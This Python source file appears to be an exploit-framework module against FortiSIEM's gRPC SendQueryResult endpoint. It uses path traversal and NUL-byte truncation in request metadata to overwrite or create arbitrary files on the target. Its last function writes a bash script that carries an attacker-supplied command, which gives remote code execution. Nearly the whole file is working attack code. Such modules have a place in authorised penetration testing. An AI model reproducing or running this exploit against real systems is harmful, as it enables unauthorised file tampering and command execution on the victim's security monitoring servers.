#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FortiSIEM SendQueryResult gRPC file-write primitives (CVE-2026-106173 family)."""

from __future__ import annotations

import pathlib
import secrets

from core.framework.option import OptBool, OptPort

from lib.protocols.grpc.grpc_client import Grpc_client
from lib.protocols.http2.http2_client import Http2_client


class Fortisiem_grpc_write(Http2_client, Grpc_client):
    """Mixin: path traversal + NUL truncation on /phoenix.phoenixSvc/SendQueryResult."""

    DEFAULT_GRPC_PORT = 27918
    RPC_PATH = "/phoenix.phoenixSvc/SendQueryResult"
    TRAVERSAL_DEPTH = 12

    port = OptPort(DEFAULT_GRPC_PORT, "FortiSIEM gRPC (HTTP/2) port", required=True)
    dry_run = OptBool(False, "Build requests but do not send", required=False, advanced=True)
    verbose = OptBool(True, "Log HTTP/2 / gRPC request details", required=False, advanced=True)

    def _grpc_port(self) -> int:
        raw = getattr(self, "port", self.DEFAULT_GRPC_PORT)
        if hasattr(raw, "value"):
            raw = raw.value
        return int(raw or self.DEFAULT_GRPC_PORT)

    def _log_detail(self, message: str) -> None:
        if getattr(self, "verbose", False):
            if hasattr(self.verbose, "value"):
                if not self.verbose.value:
                    return
            from core.output_handler import print_info

            print_info(message)

    def fortisiem_metadata(
        self,
        query_id: bytes,
        src_ip: bytes = b"127.0.0.1",
        period_start: bytes = b"0",
        period_end: bytes = b"0",
    ) -> list[tuple[bytes, bytes]]:
        return [
            (b"header-ver", b"v1"),
            (b"src-ip", src_ip),
            (b"query-id", query_id),
            (b"period-start", period_start),
            (b"period-end", period_end),
        ]

    def fortisiem_path_expression(self, metadata: list[tuple[bytes, bytes]]) -> bytes:
        values = dict(metadata)
        return (
            b"/query/result/"
            + values[b"query-id"]
            + b"/result-"
            + values[b"src-ip"]
            + b"-"
            + values[b"period-start"]
            + b"-"
            + values[b"period-end"]
            + b"-<server-call-id>.dat"
        )

    def fortisiem_path_traversal(self, remote: pathlib.PurePosixPath) -> bytes:
        if not remote.is_absolute():
            raise ValueError("Remote path must be absolute")
        if "\x00" in str(remote):
            raise ValueError("Remote path cannot contain NUL before encoding")
        prefix = b"../" * self.TRAVERSAL_DEPTH
        return prefix + str(remote).lstrip("/").encode()

    def build_fortisiem_http2_request(
        self,
        host: str,
        metadata: list[tuple[bytes, bytes]],
        file_content: bytes,
    ) -> bytes:
        port = self._grpc_port()
        authority = f"{host}:{port}"
        builder = self.http2_grpc_post_builder(authority, self.RPC_PATH)
        for name, value in metadata:
            builder.header(name, value)
        return builder.build(self.grpc_field1_bytes_body(file_content))

    def describe_fortisiem_request(
        self,
        host: str,
        metadata: list[tuple[bytes, bytes]],
        file_content: bytes,
        request: bytes,
        kernel_path: pathlib.PurePosixPath | None,
    ) -> None:
        scheme = "http" if self._h2_plaintext() else "https"
        path_expr = self.fortisiem_path_expression(metadata)
        nul_at = path_expr.find(b"\x00")
        self._log_detail(f"RPC: {scheme}://{host}:{self._grpc_port()}{self.RPC_PATH}")
        self._log_detail(
            f"Transport: HTTP/2 {'prior knowledge' if self._h2_plaintext() else 'TLS (ALPN h2)'}"
        )
        for name, value in metadata:
            self._log_detail(f"  {name.decode()}: {value!r}")
            off = value.find(b"\x00")
            if off != -1:
                self._log_detail(f"  -> NUL@{off} prefix {value[:off]!r}")
        self._log_detail(f"Path expression: {path_expr!r}")
        if nul_at != -1:
            self._log_detail(f"Filesystem C-string: {path_expr[:nul_at]!r}")
        if kernel_path is not None:
            self._log_detail(f"Intended file: {kernel_path}")
        self._log_detail(f"Request size: {len(request)} bytes, payload {len(file_content)} bytes")

    def transmit_fortisiem_query_result(
        self,
        host: str,
        metadata: list[tuple[bytes, bytes]],
        file_content: bytes,
        kernel_path: pathlib.PurePosixPath | None = None,
    ) -> None:
        request = self.build_fortisiem_http2_request(host, metadata, file_content)
        self.describe_fortisiem_request(host, metadata, file_content, request, kernel_path)
        dry = getattr(self, "dry_run", False)
        if hasattr(dry, "value"):
            dry = dry.value
        if dry:
            return
        self.send_http2_request(host, self._grpc_port(), request)

    def fortisiem_overwrite_remote(
        self,
        host: str,
        remote_path: pathlib.PurePosixPath,
        content: bytes,
    ) -> None:
        from core.output_handler import print_status

        print_status(f"Overwrite {remote_path}")
        query_id = self.fortisiem_path_traversal(remote_path) + b"\x00ignored"
        self.transmit_fortisiem_query_result(
            host,
            self.fortisiem_metadata(query_id),
            content,
            kernel_path=remote_path,
        )

    def fortisiem_create_remote(
        self,
        host: str,
        remote_path: pathlib.PurePosixPath,
        content: bytes,
    ) -> None:
        from core.output_handler import print_status

        parent = remote_path.parent
        nonce = secrets.token_hex(4).encode()
        stage = parent / f"result-stage-{nonce.decode()}-dir"
        print_status(f"Stage directory {stage}")
        self.transmit_fortisiem_query_result(
            host,
            self.fortisiem_metadata(self.fortisiem_path_traversal(stage)),
            b"stage\n",
        )
        print_status(f"Create {remote_path}")
        md = self.fortisiem_metadata(
            self.fortisiem_path_traversal(parent),
            src_ip=b"stage",
            period_start=nonce,
            period_end=b"dir/../" + remote_path.name.encode() + b"\x00ignored",
        )
        self.transmit_fortisiem_query_result(host, md, content, kernel_path=remote_path)

    def fortisiem_write_service_script(
        self,
        host: str,
        remote_path: str | pathlib.PurePosixPath,
        cmd: str,
    ) -> None:
        from core.output_handler import print_status

        remote = pathlib.PurePosixPath(str(remote_path))
        body = f"#!/bin/bash\n{cmd}\n".encode()
        print_status(f"Service script ({len(body)} bytes) -> {remote}")
        self._log_detail(body.decode())
        self.fortisiem_overwrite_remote(host, remote, body)
